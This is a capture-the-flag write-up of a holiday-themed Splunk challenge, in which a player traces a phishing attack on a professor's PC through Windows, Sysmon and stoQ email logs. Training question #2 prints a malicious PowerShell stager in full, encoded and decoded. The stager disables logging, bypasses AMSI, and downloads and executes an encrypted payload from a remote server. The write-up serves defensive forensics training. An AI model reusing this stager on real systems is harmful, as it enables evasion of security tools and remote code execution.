# 2. Secondary Objectives
## 2.4. Splunk
### 2.4.1. Description
Speaking with Prof. Banas:\
	This term, I'm teaching "HOL 404: The Search for Holiday Cheer in Popular Culture," and I've had quite a shock! I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC. Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP! If I don't, he will have to report the incident to the boss of the SOC. Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks. I don't know anything about computer security. Can you please help me?

Chat with Kent:\
	Guest (me)\
		Hi Kent :-)\
	Kent\
		Hi yourself.\
	Guest (me)\
		I ran into Professor Banas. He said you contacted him about his computer being hacked?\
	Kent\
		Oh, well lots of analysts try to make it here in the ELF U SOC, but most of them crack under the pressure\
	Guest (me)\
		Well, can I help?\
	Kent\
		You can try. Go check out #ELFU SOC. Maybe someone there will have time to bring you up to speed. Here's a tip, click on those blinking red dots to the left column and read very carefully.\
	Guest (me)\
		Thanks???\

Chat with #ELFU SOC:\
	Cosmo Jingleberg\
		Hey did you all see that beaconing detection from RITA?\
	Zippy Frostington\
		Yep. And we have some system called 'sweetums' here on campus communicating with the same weird IP\
	Alice Bluebird\
		Gah... that's Professor Banas' system from over in the Polar Studies department\
	Guest (me)\
		That's why I'm here, actually...Kent sent me to this channel to help with Prof. Banas' system\
	Alice Bluebird\
		smh...I'll DM you\

Chat with Alice Bluebird:\
	Alice Bluebird\
		hey hey...\
	Guest (me)\
		Hiya Alice\
	Alice Bluebird\
		I see you've met Kent\
	Guest (me)\
		briefly. He seems...frustrated\
	Alice Bluebird\
		Pretty accurate. He's been here a long time and he struts around like some sort of cyber-peacock\
	Alice Bluebird\
		Some time (preferably over good eggnog) I'll tell you about his horrible opsec, too\
	Alice Bluebird\
		Suffice to say we have adversaries poking fun at him during attacks. JML\
	Guest (me)\
		JML?\
	Alice Bluebird\
		jingle my life\
	Guest (me)\
		LOL!\
	Alice Bluebird\
		So Cosmo, Zippy, and I have a good handle on what went down with Professor B's system\
	Guest (me)\
		ah, gotcha\
	Alice Bluebird\
		But we can always use good analysts here in the SOC, so if you can figure it out, we'll put in a good word with the boss of the SOC.\
	Guest (me)\
		Let's do this!\
	Alice Bluebird\
		Okay. Your goal is to find the message for Kent that the adversary embedded in this attack.\
	Alice Bluebird\
		If you think you have the chops for that, don't let me slow you down. Get searching and enter the Challenge Question answer when you've found it.\
	Alice Bluebird\
		You'll need to know some things, though:\
		We use Splunk, so click here or hit the Search link in the navigation up above to get started.\
		I copied some raw files here or click the File Archive link in the navigation. (You'll find some references to the File Archive contents in Splunk)\
		You'll need to use both of these resources to answer the Challenge Question!\
	Alice Bluebird\
		Don't worry though, I can get you started down the right path with a few hints if you need 'em. All you have to do is answer the first training question. If you've read all the chat windows here, you already have the answer ;-)\
### 2.4.2. Training question #1
#### 2.4.2.1. Description
What is the short host name of Professor Banas' computer?
#### 2.4.2.2. Solution
Performing the search:
```splunk
	sourcetype="WinEventLog" Account_Name=*banas* | stats count by ComputerName
```
Returns one computer, named sweetums.elfu.org.
#### 2.4.2.3. Flag
The flag is: **sweetums**.
#### 2.4.2.4. Afterwords
Training BOT
	Training Question 1 Answered Correctly
Guest (me)
	Boom, first one done.
Alice Bluebird
	Oh good, you read the #ELFU SOC chat :-)
Alice Bluebird
	I jest :-) Okay check out the next question. You'll need to actually search for the answer this time.
Alice Bluebird
	You may not know this, but Professor Banas is pretty close to the big guy.
Guest (me)
	Santa?
Alice Bluebird
	Yep. This is why we keep detailed logs from Professor B's machine
Guest (me)
	I didn't know Banas was inner-circle... But then again, why would I know that?
Alice Bluebird
	Well he is and the adversaries know it. They are always attacking him and the Elf U network trying to get to Santa.
Alice Bluebird
	Our very first worry was they may have found some of Santa's sensitive data.
Guest (me)
	Did they?
Alice Bluebird
	That's what you need to tell me!
Alice Bluebird
	I'll give you a tip. Sometimes simpler is better. If you have a word that you are really interested in, just start searching for it. Here is an example of searching for the professor's username
Alice Bluebird
	It's not a very precise search technique, but it can provide context and get you started.
Guest (me)
	nods
Alice Bluebird
	Use that technique (with a different search term) to answer question 2.
Guest (me)
	I'm struggling with what to search for. Maybe I should search for "sweetums"
Alice Bluebird
	Well, I just told you who we were most worried about protecting. Maybe start with his name! Also, sweetums is a good thought, but this is a training exercise and pretty much all the data pertains to that one host already so just searching for that may not get you far.
### 2.4.3. Training question #2
#### 2.4.3.1. Description
What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)
#### 2.4.3.2. Solution
Searching for the computer from professor banas allows to get the username “cbanas” and shows an interesting powershell line being executed with b64 encoded payload:
```powershell
powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUAbgBlAFIAaQBDAC4ARABJAEMAVABJAG8ATgBBAHIAeQBbAFMAdAByAEkATgBHACwAUwB5AFMAVABFAG0ALgBPAGIAagBlAGMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABTAEUAewBbAFMAQwByAEkAUABUAEIAbABPAEMASwBdAC4AIgBHAEUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBBAEwAVQBlACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBqAEUAYwB0ACAAQwBvAGwAbABFAGMAVABpAG8AbgBzAC4ARwBFAG4AZQByAEkAQwAuAEgAYQBzAGgAUwBlAFQAWwBzAFQAcgBJAE4ARwBdACkAKQB9AFsAUgBFAGYAXQAuAEEAUwBTAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAVAAuAFMARQBSAHYAaQBjAEUAUABvAEkAbgBUAE0AYQBOAGEARwBlAHIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABJAG4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAHcALQBPAGIAagBFAEMAVAAgAFMAeQBzAFQARQBNAC4ATgBlAFQALgBXAGUAQgBDAEwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBBAEQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwB5AFMAVABlAE0ALgBOAGUAdAAuAFcAZQBCAFIARQBRAHUARQBTAFQAXQA6ADoARABFAEYAYQBVAEwAVABXAGUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAUgBvAFgAeQAuAEMAUgBFAEQAZQBuAFQASQBBAGwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAFQALgBDAFIAZQBkAGUATgBUAGkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcATwBSAGsAQwBSAEUARABlAG4AVABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcAegBkACEAUABtAHcAMwBKAC8AcQBuAHUAVwBvAEgAWAB+AD0AZwAuAHsAPgBwACwARwBFAF0AOgB8ACMATQBSACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA0ADQALgAyADAAMgAuADQANgAuADIAMQA0ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABFAEEARABFAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AcgBlAFQAOQBYAFEAQQBsADAARQBNAEoAbgB4AHUAawBFAFoAeQAvADcATQBTADcAMABYADQAPQAiACkAOwAkAEQAQQBUAGEAPQAkAFcAQwAuAEQAbwB3AG4AbABPAEEARABEAEEAdABBACgAJABzAEUAcgArACQAVAApADsAJABJAHYAPQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAEUATgBHAHQASABdADsALQBKAE8ASQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

The b64 payload decoded is:
```powershell
IF($PSVerSioNTaBLe.PSVERsIOn.MAJor -gE 3){$GPF=[Ref].ASsEMBly.GETTyPE('System.Management.Automation.Utils')."GEtFiE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');IF($GPF){$GPC=$GPF.GeTVAluE($nUlL);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$val=[COLlEcTioNs.GEneRiC.DICTIoNAry[StrING,SySTEm.ObjecT]]::NeW();$vAl.AdD('EnableScriptB'+'lockLogging',0);$vaL.ADd('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl}ElSE{[SCrIPTBlOCK]."GEtFIe`lD"('signatures','N'+'onPublic,Static').SETVALUe($NUll,(NEW-OBjEct CollEcTions.GEnerIC.HashSeT[sTrING]))}[REf].ASSEMBlY.GETTYPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GETFielD('amsiInitFailed','NonPublic,Static').SEtValUe($NUlL,$True)};};[SySteM.NeT.SERvicEPoInTMaNaGer]::EXPecT100CONtInUe=0;$wc=NEw-ObjECT SysTEM.NeT.WeBCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEADErS.ADd('User-Agent',$u);$Wc.ProXy=[SySTeM.Net.WeBREQuEST]::DEFaULTWebProXy;$WC.PRoXy.CREDenTIAls = [SySTEm.NET.CRedeNTiAlCAcHe]::DeFaulTNeTwORkCREDenTiALS;$Script:Proxy = $wc.Proxy;$K=[SySTEM.Text.EncOdING]::ASCII.GeTBYteS('zd!Pmw3J/qnuWoHX~=g.{>p,GE]:|#MR');$R={$D,$K=$ARGs;$S=0..2.4;0..2.4|%{$J=($J+$S[$_]+$K[$_%$K.COUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://144.202.46.214:8080';$t='/admin/get.php';$WC.HEADErs.Add("Cookie","session=reT9XQAl0EMJnxukEZy/7MS70X4=");$DATa=$WC.DownlOADDAtA($sEr+$T);$Iv=$DatA[0..3];$DatA=$dATa[4..$DatA.lENGtH];-JOIN[ChaR[]](& $R $DatA ($IV+$K))|IEX
```

This is the moment when I decided to dig further on the powershell, extracting additional fields for the CommandInvocation and the ParameterBinding in the messages:
```splunk
ComputerName=*sweetums* Message=*powershell* 
| rex field=_raw "CommandInvocation\(.*?\): \"(?<CommandInvocation>.*?)\""
| rex max_match=0 field=_raw "ParameterBinding.*?value=\"(?<ParameterBinding>.*?)\""
| dedup CommandInvocation
| table CommandInvocation, ParameterBinding
```

The above query returns 15 results, all of the CommandInvocation are PowerShell commands and the ParameterBinding looked like command arguments. Omitting the full output for brevity, the most interesting commands identified are:

| CommandInvocation | ParameterBinding |
| --- | --- |
| Get-Item | C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt |
| Get-ChildItem | C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt |
| $_.FullName | C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt |

Huge chance that these commands were used to exfiltrate the Naughty_and_Nice_2019_draft.txt file.
#### 2.4.3.3. Flag
The flag is: **C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt**.
#### 2.4.3.4. Afterwords
Training BOT
	Training Question 2 Answered Correctly
Alice Bluebird
	Okay that was a good warmup. FYI, Here's the search I'd have used for that last one.
Alice Bluebird
	Why he had a draft copy of this year's naughty and nice list sitting on his PC, I'll never know.
Alice Bluebird
	Did you see the download of the scanning tool, too? That's interesting, but let's stay on task here.
Guest (me)
	That was pretty easy...
Alice Bluebird
	Well, you'll need to do a lot more than super-grep for Santa Claus to work in this SOC.
Guest (me)
	haha understood
Alice Bluebird
	You probably noticed right away that the attack used PowerShell. I need you to tell me the fully qualified domain name (FQDN) used for command and control.
Alice Bluebird
	Use Microsoft Sysmon data to answer this question. Here's some background on Sysmon if you need it.
Alice Bluebird
	To search Sysmon data in our system, start by specifying the sourcetype using a search like sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
Alice Bluebird
	In Sysmon, Event Code 3 represents network connections and you can narrow your search by adding the term 'powershell'. There is an implied boolean AND operator between any search terms that you add. Try to narrow your search to include these terms.
Alice Bluebird
	Your search should look something like this sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3
Alice Bluebird
	Look through the lists of Interesting Fields and Selected Fields in the left-hand column of the search window. You should find what you are looking for there.
### 2.4.4. Training question #3
#### 2.4.4.1. Description
What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)
#### 2.4.4.2. Solution
Performing the search:
```splunk
sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3 
| stats count by dest
```
Returns two results, of which one is an FQDN containing the IP in the payload of the powershell found before.
#### 2.4.4.3. Flag
The flag is: **144.202.46.214.vultr.com**.
#### 2.4.4.4. Afterwords
Training BOT
	Training Question 3 Answered Correctly
Alice Bluebird
	Well done.
Guest (me)
	Thanks
Alice Bluebird
	Let's investigate where all this PowerShell originated. You should start by running this search to view all the PowerShell logs on the system.
Guest (me)
	Searching now. What am I looking for?
Alice Bluebird
	We'd like to determine the process ID or process GUID associated with these PowerShell logs, but that information is not included in the events we have.
Guest (me)
	Ah, dead-end then?
Alice Bluebird
	Goodness no! We just need to pivot.
Guest (me)
	On what though?
Alice Bluebird
	We can pivot on...time.
Guest (me)
	whoa...
Alice Bluebird
	First off, flip the results of that last search so the oldest event is at the top of the list by adding | reverse to the end
Guest (me)
	pipe reverse. That's handy.
Alice Bluebird
	Indeed. Okay, this is where we pivot...
Alice Bluebird
	Look at the Time column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. Accept the default of +/- five seconds and click apply. Then remove the sourcetype search term and also remove the '| reverse' and re-run the search.
Guest (me)
	Well now I see lots of different types of events from that ten-second window.
Alice Bluebird
	Try to find a process ID of interest. Sysmon events are good for that. You should be able to find two different process IDs from Sysmon events in that time window...
Alice Bluebird
	You need to uncover what launched those processes. If Sysmon Event Code 1 results are not available, try looking for Windows Process Execution events (Event ID 4688). A search to get you started with 4688 logs is sourcetype=WinEventLog EventCode=4688
Alice Bluebird
	Keep in mind that 4688 events record process IDs in hexadecimal, so you may need to do some conversion. Remember you should have a couple of process IDs that are interesting. Convert them to hex and search away in the 4688 events. Oh and at this point (when you are searching for 4688 events) go ahead and set your time window back to all time so you don't miss anything.
Guest (me)
	Uhh, this one is pretty difficult.
Alice Bluebird
	Yep, if the above is not clear, you may want to check out a KringleCon 2 talk by James Brodsky that covers this topic in detail.
Alice Bluebird
	You're looking for a "document" that appears to be involved with kicking off all this PowerShell.
### 2.4.5. Training question #4
#### 2.4.5.1. Description
What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)
#### 2.4.5.2. Solution
Having already an interesting PowerShell startup line from before, I went to sort results for that command line by _time:
```splunk
ComputerName=*sweetums* Message="*powershell -noP -sta -w 1 -enc*" 
| sort _time
```

The first result has PID 0x16e8 (5864 in decimal) and _time 2019-08-25 17:18:35.

Narrowing the search for process creation events between 2019-08-25 17:18:00.000 and 17:18:35.001, it is possible to find a WINWORD execution with the below search:
```splunk
ComputerName=*sweetums* EventCode=4688
| sort +_time
```

The command line for this execution is "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o "" with PID 0x187c.

To confirm the assumption that this is the attack vector used, I searched for process spawned by this PID with search:
```splunk
ComputerName=*sweetums* EventCode=4688 Creator_Process_ID=0x187c
```

This returned one result with command line "C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE"  /Embedding that looks suspicious enough, also meaning that macros were enabled.

#### 2.4.5.3. Flag
The flag is: **19th Century Holiday Cheer Assignment.docm**.
#### 2.4.5.4. Afterwords
Training BOT
	Training Question 4 Answered Correctly
Alice Bluebird
	Good job. Malicious Word doc...
Guest (me)
	yeah...So you want me to find out where it came from?
Alice Bluebird
	Yes. You've heard of stoQ right?
Guest (me)
	umm....
Alice Bluebird
	Well, it's the coolest open source security tool you've probably never heard of.
Alice Bluebird
	It's an automation framework that we use to analyze all email messages at Elf U. Check out the stoQ project home page. Oh and here are slides from a talk on stoQ from the SANS DFIR Summit a few years back.
Guest (me)
	neat!
Alice Bluebird
	stoQ output is in JSON format, and we store that in our log management platform. It allows you to run powerful searches like this one. Check out those strange-looking field names like results{}.workers.smtp.subject. That's how JSON data looks in our search system, and stoQ events are made up of some fairly deeply nested JSON. Just keep that in mind.
Alice Bluebird
	Okay, time for you to play around with that search and answer the question. You should be aware that Professor Banas was very clear in his instructions to his students: All assignment submissions must be made via email and must have the subject 'Holiday Cheer Assignment Submission'. Remember email addresses are not case sensitive so don't double-count them!
### 2.4.6. Training question #5
#### 2.4.6.1. Description
How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)
#### 2.4.6.2. Solution
Knowing the subject and fields to filter on by previous question, issuing below query provided the distinct count of senders:
```splunk
* results{}.workers.smtp.subject="Holiday Cheer Assignment Submission" 
| stats dc(results{}.workers.smtp.from) count
```
#### 2.4.6.3. Flag
The flag is: **21**.
#### 2.4.6.4. Afterwords
Training BOT
	Training Question 5 Answered Correctly
Alice Bluebird
	Nice, you are getting the hang of this.
Guest (me)
	It's fun!
Alice Bluebird
	The attacker used MITRE ATT&CK Technique 1193 in their attack on Professor Banas.
Guest (me)
	mmmmm hmmmm
Alice Bluebird
	This one should be easy for you. Just use what you already know about the suspicious file name you identified, and about the type of visibility that stoQ gives you…
### 2.4.7. Training question #6
#### 2.4.7.1. Description
What was the password for the zip archive that contained the suspicious file?
#### 2.4.7.2. Solution
Knowing the attack is a spear phishing and that the attachment is a zip file, the search below returns the body of the only email with a zip file as attachment:
```splunk
* "results{}.workers.exif.filetype"=zip 
| table results{}.workers.smtp.body
```
#### 2.4.7.3. Flag
The flag is: **123456789**.
#### 2.4.7.4. Afterwords
Training BOT
	Training Question 6 Answered Correctly
Alice Bluebird
	Good.
Guest (me)
	Can stoQ deal with password-protected zip attachments like that one?
Alice Bluebird
	It can! It tries a list of common passwords, and the attacker chose one that was on the list.
Guest (me)
	Sweet
Alice Bluebird
	Here's another easy one for you...
### 2.4.8. Training question #7
#### 2.4.8.1. Description
What email address did the suspicious file come from?
#### 2.4.8.2. Solution
Knowing the answer to the previous question, it was enough to print out the sender:
```splunk
* "results{}.workers.exif.filetype"=zip 
| table results{}.workers.smtp.from
```

#### 2.4.8.3. Flag
The flag is: **bradly.buttercups@eifu.org**.
#### 2.4.8.4. Afterwords
Training BOT
	Training Question 7 Answered Correctly
Alice Bluebird
	Well, now you are ready to find the message that the attacker embedded for our friend Kent.
Alice Bluebird
	Kent missed it, which is not surprising, but Zippy noticed a funny (yet terrifying) message in the properties of the malicious document.
Guest (me)
	Hmmm. I was going to start looking through the macros.
Alice Bluebird
	Look, I was not about to put the actual malicious executable content into this training exercise.
Guest (me)
	Oh, understood. I will dig for properties.
Alice Bluebird
	Remember I provided you with a File Archive. stoQ puts metadata into the log management platform, but it stores the raw artifacts in their entirety in the archive. Use the stoQ events in the search platform to guide your search through the File Archive.
Alice Bluebird
	Start with this stoQ event
Alice Bluebird
	Look in the 'results' array. Each element contains the name of the file that stoQ extracted in the 'results->payload_meta->extra_data->filename' field. And when you find one of interest, use the associated 'results->archivers->filedir->path' field to guide you through the File Archive.
Guest (me)
	Uhhh okay. But that JSON event is a beast. So many 'results'!
Alice Bluebird
	Yeah but you can use it to your advantage with the Splunk spath command. Add this to the end of that last search I provided.
	| eval results = spath(_raw, "results{}") 
	| mvexpand results
	| eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename 
	| search fullpath!="" 
	| table filename,fullpath
Alice Bluebird
	Last thing for you today: Did you know that modern Word documents are (at their core) nothing more than a bunch of .xml files?
Guest (me)
	haha! I'm on it.

### 2.4.9. Challenge Question
#### 2.4.9.1. Description
What was the message for Kent that the adversary embedded in this attack?
#### 2.4.9.2. Solution
Please refer to “*1.6. Splunk*”.
#### 2.4.9.3. Flag
The flag is: **Kent you are so unfair. And we were going to make you the king of the Winter Carnival.**.
#### 2.4.9.4. Afterwords
Trainigng Center message:
	Congratulations!
	You found the message from the attacker. Be sure to record it somewhere safe for your writeup! Oh, and feel free to poke around here as long as you'd like!

Chat with Alice Bluebird:
	Training BOT
		CHALLENGE QUESTION Answered Correctly
	Alice Bluebird
		Oh nice job on the challenge question!
	Guest (me)
		Thx! And thanks for all the help :-)
	Alice Bluebird
		No worries. Steep learning curve around here.
	Alice Bluebird
		I'll put in a good word for you with the boss of the SOC.
	Alice Bluebird
		and feel free to poke around more. There's fun stuff in the data that I did not guide you to.
	Guest (me)
		Oh cool I may do that...but do you think it's getting too weird around here?
	Alice Bluebird
		Absolutely

Chat with Kent:
	Guest (me)
		Oh man that's pretty embarrassing, eh?
	Kent
		Oh you again?
	Guest (me)
		Lulz…
		Kent you are so unfair. And we were going to make you the king of the Winter Carnival.
	Kent
		You'll rue the day.
	Guest (me)
		Who talks like that?

### 2.4.10. Afterwords
Speaking again with Professor Banas:
	Oh, thanks so much for your help! Sorry I was freaking out. I've got to talk to Kent about using my email again...and picking up my dry cleaning.
